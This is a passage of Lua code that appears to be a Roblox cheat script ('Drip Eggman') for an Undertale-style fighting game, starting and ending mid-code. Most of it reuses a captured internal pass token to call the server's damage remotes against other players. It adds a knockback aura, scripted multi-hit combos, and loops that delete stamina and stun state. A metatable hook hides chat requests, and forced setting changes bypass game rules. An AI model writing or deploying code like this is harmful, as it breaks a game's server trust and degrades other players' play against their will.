wait(0.2)
lvup = true
end
end

wait(2)
lvIncreasing = false
print("debug4")
end
end)
until lvSystem == false
end)

ninePressed = false
game:GetService("UserInputService").InputBegan:Connect(function(key, gc)
    if gc then return end
    if key.KeyCode == Enum.KeyCode["Nine"] then
    if lvPlaying == true then
    print("wait a sec")
    else
        if ninePressed == false then
        local player = game.Players.LocalPlayer
        local char = player.Character
        local sound = Instance.new('Sound',char.Head)
        local id = 5665639497
        sound.Volume = 3
        sound.SoundId = 'rbxassetid://'..id
        sound:Play()
        wait()
        local player = game.Players.LocalPlayer
        local char = player.Character
        local sound = Instance.new('Sound',char.Head)
        local id = 5665639750
        sound.Volume = 3
        sound.SoundId = 'rbxassetid://'..id
        sound:Play()
        wait(0.1)
        ninePressed = true
        repeat wait()
            TextLabel2.Text = 'LV: '..(lv)
            lv = lv + 1
            TextLabel2.Text = 'LV: '..(lv)
        until lv == 13
        end
end
end
end)

game:GetService("UserInputService").InputBegan:Connect(function(key, gc)
    if gc then return end
    if key.KeyCode == Enum.KeyCode["Zero"] then
            print("lv up13")
    lvBarVal = lvBarVal + 0.1
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
end
end)

end)

lvcheck = true
spawn(function()
repeat wait()
if lv == 1 then truelv = 1
elseif lv == 2 then truelv = 2
elseif lv == 3 then truelv = 3
elseif lv == 4 then truelv = 4
elseif lv == 5 then truelv = 5
elseif lv == 6 then truelv = 6
elseif lv == 7 then truelv = 7
elseif lv == 8 then truelv = 8
elseif lv == 9 then truelv = 9
elseif lv == 10 then truelv = 10
elseif lv >= 10 then truelv = 10
end
until lvcheck == false
end)

function maxLV()
    col = 255
    print("debug2231")
    repeat wait()
        lv = lv + 1
        col = col - 5
        TextLabel.Text = 'LV: '..(lv)
        TextLabel.TextColor3 = Color3.fromRGB(255, col, col)
    until lv == 99
end

function KnockbackAura(val)
    kbAura = true
if kbAura == true then
repeat wait(1.1)
local player = game.Players.LocalPlayer
local char = player.Character
for _,v in pairs(game.workspace:GetChildren()) do

if v:FindFirstChildOfClass('Humanoid') then
if v:FindFirstChild('Torso') then
range = (char.PrimaryPart.Position - v.PrimaryPart.Position).Magnitude
if range <15 and v.Name ~= player.Name then
print("debug23837")
spawn(function()
local A_1 = getrenv()._G.Pass
local A_2 = v
local A_3 =  {
      ["Type"] = "Knockback", 
      ['HitEffect'] = 'HeavyHitEffect',
      ["HitTime"] = 2, 
      ["Velocity"] = Vector3.new(0,35,0) + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 75,
      ["VictimCFrame"] = CFrame.new(), 
      ['CombatInv'] = true,
      ["Damage"] = 10
}
local Event = game:GetService("ReplicatedStorage").Remotes.Damage
Event:InvokeServer(A_1, A_2, A_3)
end)
end
end
end
end

until kbAura == false
end
end

phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "v" then 
	    if phase2 == true then
	        wait(1)
		local A_1 = 
			{
				[1] = getrenv()._G.Pass,
				[2] = "Chatted", 
				[3] = " You will NEVER WIN!",
				[4] = Color3.fromRGB(255, 255, 255),
			}
			local Event = game:GetService("ReplicatedStorage").Remotes.Events
		Event:FireServer(A_1)
		
		wait(0.5) 
		
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 1
		KG.SoundId = "rbxassetid://357417055"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://3752218582"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.GutHurt, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 100), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
	end
end
end)

phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "b" then 
	    if phase2 == true then
	        wait(1)
		local A_1 = 
			{
				[1] = getrenv()._G.Pass,
				[2] = "Chatted", 
				[3] = " Let's have some fun.",
				[4] = Color3.fromRGB(255, 255, 255),
			}
			local Event = game:GetService("ReplicatedStorage").Remotes.Events
		Event:FireServer(A_1)
		
		wait(0.5) 
		
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 1
		KG.SoundId = "rbxassetid://357417055"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://3746476750"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(40, 20, 40), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(100, 20, 100), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
	end
end
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Resources.MoveEffects.GasterBlasters.GasterBlaster:GetChildren()) do
if v.Name == 'Head' then
clone19 = v:Clone()
clone19.Name = 'SmallBlasterHead'
clone19.Parent = char
clone19.Anchored = false
clone19.Union.Anchored = false
clone19.BodyUnion.Anchored = false
clone19.Eye.Anchored = false

for _,v in pairs(clone19:GetDescendants()) do
if v.Name == 'Eye' then
v.Name = 'BlasterEye'
end
end

weld1 = Instance.new('Weld',clone19)
weld1.Part0 = clone19
weld1.Part1 = char['Head']
weld1.C0 = CFrame.new(-9, -3.6, -3)*CFrame.Angles(0, 0, 0)
clone19.Transparency = 0
end
end

spawn(function()
repeat
    for hue = 0, 1, 1/360 do
        wait()
for _,v in pairs(clone19:GetDescendants()) do
if v.Name == 'BlasterEye' then
v.Color = Color3.fromHSV(hue, 1, 1)

spawn(function()
local A_1 =  {
      [1] = getrenv()._G.Pass, 
      [2] = "PlaySound", 
      [3] = game:GetService('ReplicatedStorage').Resources.Sounds.Moves.GasterBlasters.Gaster_Summon, 
      [4] = char.Head
}
local Event = game:GetService("ReplicatedStorage").Remotes.Functions
Event:InvokeServer(A_1)
end)
end
end
end
until false
end)
end)

wait(2)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Resources.MoveEffects.GasterBlasters.GasterBlaster:GetChildren()) do
if v.Name == 'Head' then
clone19 = v:Clone()
clone19.Name = 'SmallBlasterHead'
clone19.Parent = char
clone19.Anchored = false
clone19.Union.Anchored = false
clone19.BodyUnion.Anchored = false
clone19.Eye.Anchored = false

for _,v in pairs(clone19:GetDescendants()) do
if v.Name == 'Eye' then
v.Name = 'BlasterEye'
end
end

weld1 = Instance.new('Weld',clone19)
weld1.Part0 = clone19
weld1.Part1 = char['Head']
weld1.C0 = CFrame.new(9, -3.6, -3)*CFrame.Angles(0, 0, 0)
clone19.Transparency = 0
end
end

spawn(function()
repeat
    for hue = 0, 1, 1/360 do
        wait()
for _,v in pairs(clone19:GetDescendants()) do
if v.Name == 'BlasterEye' then
    v.Color = Color3.fromHSV(hue, 1, 1)
    end
end
end
until false
end)
end)

spawn(function()
player = game.Players.LocalPlayer

player.PlayerGui:WaitForChild('GameOver')
player.PlayerGui.GameOver.Sound.SoundId = 'rbxassetid://256575709'--- changes game over music
player.PlayerGui.GameOver.Frame.ImageLabel.TextLabel.Script:Destroy()--destroys original the local script you want to modify or change completely
local function SCRIPT_JPEX75_FAKESCRIPT()--- making it into a function so that you can compile it into a local script
script = Instance.new('LocalScript', player.PlayerGui.GameOver.Frame.ImageLabel.TextLabel)-- creates a new local script instance
 player = game.Players.LocalPlayer
char = player.Character
mouse = player:GetMouse()
sound = Instance.new("Sound", script)
sound.Name = 'Voice'
sound.SoundId = 'rbxassetid://5416491219'
space = [[ 
]]

repeat wait()
char = player.Character
until char.Humanoid.Health <= 0.2
wait(6)
local word = "HOW DID YOU DIE?"
local length = string.len(word) 
for i = 1, length do
script.Parent.Text = string.sub(word, 1, i)
clone = sound:Clone()
clone.Parent = script
clone:Play()
wait(0.03)
end
wait(1)
word = "UR BAD."
length = string.len(word) 
for i = 1, length do 
script.Parent.Text = string.sub(word, 1, i)
clone = sound:Clone()
clone.Parent = script
clone:Play()
wait(0.03)
end
local mous
mous = mouse.Button1Down:Connect(function()
Instance.new("StringValue", player.Character).Name = "Confirmed"
mous:Disconnect()
end)
end
coroutine.resume(coroutine.create(SCRIPT_JPEX75_FAKESCRIPT))
player.PlayerGui.GameOver.Frame.ImageLabel.TextLabel.LocalScript.Name = "Script"
end)

game.Players.LocalPlayer.PlayerGui.GameOver.Sound.Looped = true

repeat wait() until game.Players.LocalPlayer.Character.Humanoid.Health == 0
music:Stop()

game.Players.LocalPlayer.Character.Bone:Destroy()
end)

EggMan.MouseButton1Down:Connect(function()
    CustomCharacters:Destroy()

game.Players.LocalPlayer.Chatted:Connect(function(Chat)
local A_1 =  {
          [1] = getrenv()._G.Pass, 
          [2] = "Chatted", 
          [3] = '[ Eggman ]\n' ..Chat, 
          [4] = Color3.fromRGB(255, 0, 0)
    }
    local Event = game:GetService("ReplicatedStorage").Remotes.Events
    Event:FireServer(A_1)
        Character = game.Players.LocalPlayer.Character
    spawn(function()
        repeat wait()
            for _,v in pairs(Character:GetChildren()) do
                if v.Name == 'DrainStamina' or v.Name == 'DrainSprint' or v.Name == 'Hit' or v.Name == 'Hitt' or v.Name == 'Grounded' or v.Name == 'StayGrounded' or v.Name == 'KnockBack' or v.Name == 'Walled' then
                    v:Destroy()
                end
            end
        until false
    end)
    end)
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    game.ReplicatedStorage.Remotes.Functions:InvokeServer({getrenv()._G.Pass,"ChangeSetting","MorphEnabled",true})
    game.Players.LocalPlayer.PlayerGui.CharacterSelection.Character.Value = "Chara"
    wait(1)
    game.Players.LocalPlayer.Character.Head:WaitForChild("HealthBar"):Destroy()
    _G.MayhemMode = true
    game.Players.LocalPlayer.Backpack:WaitForChild("Main").CharaMoves.Animations.Walk.AnimationId = "rbxassetid://7501687845"
    game.Players.LocalPlayer.Backpack:WaitForChild("Main").CharaMoves.Animations.Idle.AnimationId = "rbxassetid://7499673984"
    game.Players.LocalPlayer.Backpack:WaitForChild("Main").CharaMoves.Animations.Run.AnimationId = "rbxassetid://7501695811"
    game.Players.LocalPlayer.Backpack:WaitForChild("Main").CharaMoves.Animations.Jump.AnimationId = "rbxassetid://8088300086"
    game.Players.LocalPlayer.Backpack:WaitForChild("Main").CharaMoves.Animations.Fall.AnimationId = "rbxassetid://8088309460"
    game.Players.LocalPlayer.Backpack:WaitForChild("Main").CharaMoves.Animations.Block.AnimationId = "rbxassetid://7817144788"

local CurrentCharacter = game:GetService("Players").LocalPlayer.PlayerData.CurrentCharacter.Value

game:GetService("Players").LocalPlayer.Backpack.Main[CurrentCharacter.."Moves"].ModuleScript.Animations.BladesCombat.Light1.AnimationId = "rbxassetid://7499279325"

game:GetService("Players").LocalPlayer.Backpack.Main[CurrentCharacter.."Moves"].ModuleScript.Animations.BladesCombat.Light2.AnimationId = "rbxassetid://7499461505"

game:GetService("Players").LocalPlayer.Backpack.Main[CurrentCharacter.."Moves"].ModuleScript.Animations.BladesCombat.Light3.AnimationId = "rbxassetid://7499555702"

game:GetService("Players").LocalPlayer.Backpack.Main[CurrentCharacter.."Moves"].ModuleScript.Animations.BladesCombat.Light4.AnimationId = "rbxassetid://7499465435"

game:GetService("Players").LocalPlayer.Backpack.Main[CurrentCharacter.."Moves"].ModuleScript.Animations.BladesCombat.Light5.AnimationId = "rbxassetid://7499470030"

game:GetService("Players").LocalPlayer.Backpack.Main[CurrentCharacter.."Moves"].ModuleScript.Animations.BladesCombat.Light6.AnimationId = "rbxassetid://7499473472"

local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character.Humanoid
local UIS = game:GetService("UserInputService")
local m1cooldown = true 
UIS.InputBegan:Connect(function(input, IsTyping)
    if IsTyping then return end 
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        if not m1cooldown then return end 
        m1cooldown = false
        delay(0.3,function()
            m1cooldown = true
        end)
        
local bruh = true 
spawn(function()
while bruh == true do
    wait()
    
for i,v in pairs(Humanoid.Animator:GetPlayingAnimationTracks()) do
  if v.Animation.AnimationId == "rbxassetid://7499279325" or v.Animation.AnimationId == "rbxassetid://7499461505" or v.Animation.AnimationId == "rbxassetid://7499555702" or v.Animation.AnimationId == "rbxassetid://7499465435" or v.Animation.AnimationId == "rbxassetid://7499470030" then 
      
      bruh = false
      local Player = game.Players.LocalPlayer
local Mouse = game.Players.LocalPlayer:GetMouse()
for i,v in pairs(game:GetService("Players"):GetChildren()) do
    local magpos = (Player.Character:FindFirstChild("HumanoidRootPart").Position - v.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude
    local maxmagpos = 6
    if magpos <= maxmagpos and v ~= Player then 
        local A_1 = getrenv()._G.Pass
        local A_2 = v.Character
        local A_3 = {
    ["HitTime"] = 0.2,
    ["Type"] = "Normal", 
    ["HitEffect"] = "KnifeHitEffect",
    ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Stunned,
    ["Sound"] = game:GetService("ReplicatedStorage").Sounds.KnifeHit,
    ["CameraShake"] = "Bump",
    ["Velocity"] = Player.Character.HumanoidRootPart.CFrame.lookVector * 1,
    ["CombatInv"] = true,
    ["Damage"] = 5
}
                                
        local Event = game:GetService("ReplicatedStorage").Remotes.Damage
        Event:InvokeServer(A_1, A_2, A_3)
        
        
    end
end
elseif v.Animation.AnimationId == "rbxassetid://7499473472" then 
          local Player = game.Players.LocalPlayer
local Mouse = game.Players.LocalPlayer:GetMouse()
for i,v in pairs(game:GetService("Players"):GetChildren()) do
    local magpos = (Player.Character:FindFirstChild("HumanoidRootPart").Position - v.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude
    local maxmagpos = 6
    if magpos <= maxmagpos and v ~= Player then 
        local A_1 = getrenv()._G.Pass
        local A_2 = v.Character
        local A_3 = {
    ["HitTime"] = 1,
    ["Type"] = "Knockback", 
    ["HitEffect"] = "KnifeHitEffect",
    ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Stunned,
    ["Sound"] = game:GetService("ReplicatedStorage").Sounds.KnifeHit,
    ["CameraShake"] = "Bump",
    ["Velocity"] = Player.Character.HumanoidRootPart.CFrame.lookVector * 50 + Vector3.new(0,50,0),
    ["CombatInv"] = true,
    ["Damage"] = 30
}
                                
        local Event = game:GetService("ReplicatedStorage").Remotes.Damage
        Event:InvokeServer(A_1, A_2, A_3)
        
        
    end
end

end
end

end

end)

end
end)

    game.Players.LocalPlayer.Character["FullHateMode"]:Destroy()
    game.Players.LocalPlayer.Character["HateMode"]:Destroy()
    game.Players.LocalPlayer.Character["Karma"]:Destroy()
    game.Players.LocalPlayer.Character["HeartLocket"]:Destroy()
    game.Players.LocalPlayer.Character["HateArm"]:Destroy()
    game.Players.LocalPlayer.Character.RealKnife:Remove()
    local bypass = Instance.new("BoolValue")
    bypass.Name = "Battling"
    bypass.Parent = game.Players.LocalPlayer.Character
    wait(1)
    game.Players.LocalPlayer.StarterPlaylist["1Megalo Strike Back"]:Destroy()
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
    local Sound = Instance.new("Sound")
    Sound.Parent = game.Players.LocalPlayer.StarterPlaylist
    Sound.Volume = 0.75
    Sound.Playing = true
    Sound.Looped = true
    Sound.SoundId = "rbxassetid://6657181480" 
    Sound.Name = "e"
    game.Players.LocalPlayer.Backpack.Main.RunSpeed.Value = 100
    local gay = game.Players.LocalPlayer.Character
    player = game.Players.LocalPlayer
    char = player.Character
    local TweenService = game:GetService("TweenService")
    _G.nowings = true
    
    -- the hide Chat
    _G.hidechat = true
    local mt = getrawmetatable(game)
        local backup = mt.__namecall
        if setreadonly then setreadonly(mt, false) else make_writeable(mt, true) end
        
        mt.__namecall = newcclosure(function(...)
            local method = getnamecallmethod()
            local args = {...}
    
            if tostring(args[1]) == 'SayMessageRequest' and _G.hidechat then
            return
            end
            return backup(...)
        end)
    
    player = game.Players.LocalPlayer
    char = player.Character
    local TweenService = game:GetService("TweenService")
    _G.nowings = true

    --//=================================\\
    --||Key Jammer
    --\\=================================//
            local CAS = game:GetService("ContextActionService")
            local FREEZE_COMMAND = "CantAttack"
            CAS:BindActionAtPriority(
                FREEZE_COMMAND,
                function()
                    return Enum.ContextActionResult.Sink
                end,
                false,
                Enum.ContextActionPriority.High.Value,
                Enum.KeyCode.One,
                Enum.KeyCode.Two,
                Enum.KeyCode.Three,
                Enum.KeyCode.Four,
                Enum.KeyCode.Five,
                Enum.KeyCode.Six
            )
    --//=================================\\
    --||Loading 20%
    --\\=================================//
    game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Notification Bot";
    Text = "Eggman Loaded 20%";
    })
    
    
    --//=================================\\
    --||The Phases
    --\\=================================//

function Notification(Title, Text)
    game.StarterGui:SetCore(
        "ChatMakeSystemMessage",
        {
            Text = Title .. " : " .. Text,
            Color = Color3.new(100, 0, 0),
            TextSize = 25
        }
    )
end
        Notification("[Owner][King Dream#9746]", "Thank you for using Drip Eggman")
        Notification("[Owner][King Dream#9746]", "Hope you enjoy")

-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local TextLabel_4 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 5
Frame.Position = UDim2.new(0.00451127812, 0, 0.00910470448, 0)
Frame.Size = UDim2.new(0, 299, 0, 75)

TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0812030062, 0, 0.00910470448, 0)
TextLabel.Size = UDim2.new(0, 95, 0, 18)
TextLabel.Font = Enum.Font.Arcade
TextLabel.Text = "King Dream's Phase Selector"
TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.TextSize = 14.000

TextLabel_2.Parent = ScreenGui
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(-0.039097745, 0, 0.10015174, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.Arcade
TextLabel_2.Text = "How to use"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 14.000

TextLabel_3.Parent = ScreenGui
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(-1.3038516e-08, 0, 0.145675257, 0)
TextLabel_3.Size = UDim2.new(0, 180, 0, 50)
TextLabel_3.Font = Enum.Font.Arcade
TextLabel_3.Text = "Click the text box and put in the number of the phase u want"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 13.000
TextLabel_3.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_3.TextWrapped = true

TextBox.Parent = ScreenGui
TextBox.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Position = UDim2.new(0.036842104, 0, 0.0364188179, 0)
TextBox.Size = UDim2.new(0, 200, 0, 36)
TextBox.Font = Enum.Font.Arcade
TextBox.PlaceholderColor3 = Color3.fromRGB(0, 4, 255)
TextBox.PlaceholderText = "Phase goes here"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 4, 255)
TextBox.TextSize = 14.000

TextLabel_4.Parent = ScreenGui
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.00451126508, 0, 0.221547797, 0)
TextLabel_4.Size = UDim2.new(0, 180, 0, 50)
TextLabel_4.Font = Enum.Font.Arcade
TextLabel_4.Text = "Important: Press P after you put in the number"
TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 255)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 13.000
TextLabel_4.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_4.TextWrapped = true
function phase1()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Phase 1 what do you think this is?]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase2()
    game.Players.LocalPlayer.Character.Humanoid.Health = 1
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Hmph good job, but how long will you last now]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase3()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    I shall defeat you no matter how long it takes!]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
